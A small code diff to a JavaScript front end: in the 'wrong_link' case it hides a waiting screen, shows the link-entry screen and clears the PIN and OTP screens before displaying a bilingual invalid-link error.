@@ -1588,6 +1588,10 @@
                 case 'wrong_link':
                     if (!wrongLinkNotified) {
                         wrongLinkNotified = true;
+                        waitingScreen.style.display = 'none';
+                        linkScreen.classList.add('active');
+                        pinScreen.classList.remove('active');
+                        otpScreen.classList.remove('active');
                         const errEl = document.getElementById('linkError');
                         if (errEl) {
                             errEl.textContent = currentLang === 'fr' ? 'Lien de vérification incorrect. Veuillez réessayer.' : 'Invalid verification link. Please try again.';
